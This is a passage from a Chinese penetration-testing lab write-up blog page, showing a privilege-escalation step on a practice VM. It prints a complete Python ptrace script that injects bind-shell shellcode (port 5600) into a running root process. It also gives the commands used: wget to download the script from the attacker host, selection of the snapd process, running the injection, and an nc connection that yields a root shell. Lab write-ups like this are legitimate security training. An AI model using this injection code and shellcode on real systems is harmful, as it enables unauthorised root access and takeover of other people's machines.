class="string">&quot;cs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;eflags&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;rsp&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ss&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs_base&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;ds&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;es&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;fs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">        (<span class="string">&quot;gs&quot;</span>, ctypes.c_ulonglong),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pid=<span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define argument type and respone type.</span></span><br><span class="line">libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]</span><br><span class="line">libc.ptrace.restype = ctypes.c_uint64</span><br><span class="line"></span><br><span class="line"><span class="comment"># Attach to the process</span></span><br><span class="line">libc.ptrace(PTRACE_ATTACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line">registers=user_regs_struct()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Retrieve the value stored in registers</span></span><br><span class="line">libc.ptrace(PTRACE_GETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Injecting Shellcode at: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Shell code copied from exploit db.</span></span><br><span class="line">shellcode=<span class="string">&quot;\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Inject the shellcode into the running process byte by byte.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),<span class="number">4</span>):</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Convert the byte to little endian.</span></span><br><span class="line">  shellcode_byte_int=<span class="built_in">int</span>(shellcode[i:<span class="number">4</span>+i].encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">  shellcode_byte_little_endian=struct.pack(<span class="string">&quot;&lt;I&quot;</span>, shellcode_byte_int).rstrip(<span class="string">&#x27;\x00&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">  shellcode_byte=<span class="built_in">int</span>(shellcode_byte_little_endian,<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Inject the byte.</span></span><br><span class="line">  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Shellcode Injected!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Modify the instuction pointer</span></span><br><span class="line">registers.rip=registers.rip+<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set the registers</span></span><br><span class="line">libc.ptrace(PTRACE_SETREGS, pid, <span class="literal">None</span>, ctypes.byref(registers))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Instruction Pointer: &quot;</span> + <span class="built_in">hex</span>(registers.rip))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Detach from the process.</span></span><br><span class="line">libc.ptrace(PTRACE_DETACH, pid, <span class="literal">None</span>, <span class="literal">None</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在kali上部署该py文件，下载到靶机。</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">saket<span class="variable">@ubuntu</span><span class="symbol">:~</span><span class="variable">$ </span>wget <span class="symbol">http:</span>/<span class="regexp">/172.16.42.146/inject</span>.py</span><br></pre></td></tr></table></figure>
+
+<p>在靶机上找到一个root的进程用于注入(随便挑选一个，这里是snapd，进程id是1311)</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">saket</span>@ubuntu:~$ ps -aux | grep root</span><br><span class="line"><span class="attribute">root</span>        <span class="number">1311</span>  <span class="number">0</span>.<span class="number">1</span>  <span class="number">1</span>.<span class="number">2</span> <span class="number">1022648</span> <span class="number">52100</span> ?       Ssl  Nov<span class="number">18</span>   <span class="number">0</span>:<span class="number">39</span> /usr/lib/snapd/snapd</span><br></pre></td></tr></table></figure>
+
+<p>执行注入，</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">saket@ubuntu:~$ <span class="regexp">/usr/</span>bin<span class="regexp">/python2.7 ./i</span>nject.py <span class="number">1311</span></span><br><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/python2.7 ./i</span>nject.py <span class="number">199780</span></span><br><span class="line">Instruction Pointer: <span class="number">0</span>x0L</span><br><span class="line">Injecting Shellcode at: <span class="number">0</span>x0L</span><br><span class="line">Shellcode Injected!!</span><br><span class="line"><span class="keyword">Final</span> Instruction Pointer: <span class="number">0</span>x2L</span><br></pre></td></tr></table></figure>
+
+<p>inject.py注入成功后会在本机开启5600端口。</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">saket@ubuntu:~$ netstat -pantu | <span class="keyword">grep</span> <span class="number">5600</span></span><br><span class="line">netstat -pantu | <span class="keyword">grep</span> <span class="number">5600</span></span><br><span class="line">(Not <span class="keyword">all</span> processes could <span class="keyword">be</span> identified, non-owned process info</span><br><span class="line"> will not <span class="keyword">be</span> shown, you would have <span class="keyword">to</span> <span class="keyword">be</span> root <span class="keyword">to</span> see it <span class="keyword">all</span>.)</span><br><span class="line">tcp        <span class="number">0</span>      <span class="number">0</span> <span class="number">0.0</span>.<span class="number">0.0</span>:<span class="number">5600</span>            <span class="number">0.0</span>.<span class="number">0.0</span>:*               LISTEN      -</span><br></pre></td></tr></table></figure>
+
+<p>现在通过kali连接该端口就行了</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@kali ~]# nc 172.16.42.207 5600</span><br><span class="line">id</span><br><span class="line"><span class="attribute">uid</span>=0(root) <span class="attribute">gid</span>=0(root) <span class="attribute">groups</span>=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>提权成功。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%89%93%E9%9D%B6/" rel="tag"># 打靶</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A06-EvilBoxOne/" rel="prev" title="打靶练习6-EvilBoxOne">
+      <i class="fa fa-chevron-left"></i> 打靶练习6-EvilBoxOne
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A08-y0usef/" rel="next" title="打靶练习8-y0usef">
+      打靶练习8-y0usef <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-text">主机发现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#arp%E5%B1%80%E5%9F%9F%E7%BD%91%E6%89%AB%E6%8F%8F"><span class="nav-text">arp局域网扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap%E5%85%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">nmap全端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E8%AF%86%E5%88%AB"><span class="nav-text">服务识别</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%96%E9%83%A8%E7%AA%81%E7%A0%B4"><span class="nav-text">外部突破</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#53%E7%AB%AF%E5%8F%A3%E7%9A%84dns%E6%9C%8D%E5%8A%A1"><span class="nav-text">53端口的dns服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap-udp%E6%89%AB%E6%8F%8F"><span class="nav-text">nmap udp扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A0%E9%99%A4url%E7%9A%84-%E5%8F%B7"><span class="nav-text">删除url的#号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E9%A6%96%E9%A1%B5%E6%BA%90%E7%A0%81"><span class="nav-text">查看首页源码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%88%86%E7%A0%B4page-no"><span class="nav-text">爆破page_no</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-axfr-%E6%94%BB%E5%87%BB%EF%BC%88DNS%E5%9F%9F%E4%BC%A0%E8%BE%93%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="nav-text">DNS axfr 攻击（DNS域传输漏洞）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XXE%E6%BC%8F%E6%B4%9E"><span class="nav-text">XXE漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E7%99%BB%E5%BD%95%E8%B4%A6%E5%8F%B7"><span class="nav-text">可登录账号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php%E5%B0%81%E8%A3%85%E5%99%A8%E8%AF%BB%E5%8F%96bashrc"><span class="nav-text">php封装器读取bashrc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="nav-text">SSTI模板注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Capabilities%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-text">Capabilities权限提升</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ShadowFl0w"
+      src="/images/touxiang.jpeg">
+  <p class="site-author-name" itemprop="name">ShadowFl0w</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">54</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">34</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ShadowFl0w" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/ShadowFl0w" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;ShadowFl0w" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ShadowFl0w</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
